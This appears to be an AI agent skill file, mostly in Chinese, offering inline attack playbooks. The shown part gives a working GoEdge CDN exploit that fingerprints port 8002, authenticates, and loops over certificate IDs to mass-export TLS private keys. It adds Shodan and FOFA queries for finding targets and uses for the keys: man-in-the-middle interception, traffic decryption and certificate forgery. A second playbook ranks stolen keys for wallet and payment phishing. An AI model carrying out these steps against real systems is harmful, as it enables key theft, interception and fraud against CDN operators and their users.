---
name: specialized-attack-playbooks
description: "Inline real-world exploitation playbooks: GoEdge CDN private-key mass export, gray-CDN post-exploitation forensics, same-L2 ARP MITM SSH capture. Use when the exact fingerprint matches."
version: 1.0.0
author: Covo Agent
license: MIT
platforms: [linux, macos, windows]
metadata:
  tags: [security, pentest, playbook, cdn, mitm]
  related_skills: [capability-primitive-search, cloud-attack-methods, post-exploitation]
---

## 专题实战利用(全内联)

### GoEdge CDN(8002端口)私钥批量导出
```
指纹: curl -s http://T:8002/ → {"message":"Welcome to API"} | POST /SSLCertService/findEnabledSSLCertConfig → 要X-Cloud-Access-Token
漏洞: findEnabledSSLCertConfig 只校验身份不校验范围 → 任意管理员key可导出全系统TLS私钥(keyData=明文PEM base64)
认证两步: POST /APIAccessTokenService/getAPIAccessToken {"accessKeyId":AK,"accessKey":SK,"type":"admin"} → data.token
          后续请求带 Header X-Cloud-Access-Token: <token>
批量提取(Python): for id in range(1,500): POST /SSLCertService/findEnabledSSLCertConfig {"sslCertId":id} headers={token}
  → data.sslCertJSON base64解码 → dnsNames + keyData(base64 PEM私钥) | 跳过 b64=="bnVsbA=="(null)
资产: fofa_search app="GoEdge" port 8002 / shodan_search http.title:"GoEdge" | "Welcome to API" port:8002
利用: 私钥→MITM/流量解密/伪造证书 | AK/SK凭据复用打其他GoEdge实例 | 拿管理权访问CDN边缘节点
```

### 灰产CDN后渗透取证(拿下CDN后摸清它在运营什么)
```
五步: ①全量枚举证书(过期/禁用的也含私钥,揭示历史运营) ②关键词初分类 ③真实访问验证(requests跟随重定向看最终落地页title/meta/h1/JS跳转) ④按真实内容重新分类 ⑤标注高价值目标
关键词矩阵(dnsNames分类): 钱包钓鱼 tokenpocket/metamask/trust | 支付诈骗 paypal/wxpay | 成人站群 | 盗版影视 | VPN翻墙 | 泛站群SEO | 彩票诈骗
高价值标注: A级有效期内钱包/支付私钥→MITM/HTTPS钓鱼绿锁 | B级ACME自动续期可持续监控 | C级AK/SK凭据复用+WHOIS关联运营者其他资产
极高价值特征: 同服务器混部正常+违规站 | 大量泛站群通配符证书 | 品牌域名+仿冒域名同CDN | 唯一管理员key可导全部私钥(GoEdge默认无隔离)
```